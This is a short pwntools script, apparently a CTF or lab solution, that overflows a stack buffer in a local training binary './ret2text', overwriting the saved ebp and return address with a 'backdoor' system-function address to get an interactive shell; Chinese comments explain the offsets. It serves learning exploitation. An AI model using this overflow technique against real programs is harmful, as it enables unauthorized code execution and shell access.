from pwn import *

sh = process("./ret2text")

offset = 0x6c
add = 0x0804863A
#offset 0x6c是s到栈顶esp的距离
#0x4是ebp的长度,覆盖4字节的垃圾数据“b”,32位程序都是4个字节,64是8个
#add 0x0804863A是后门system函数地址
payload = b"a"*offset + b"b"*0x4 + p32(add)

sh.sendline(payload)

sh.interactive()
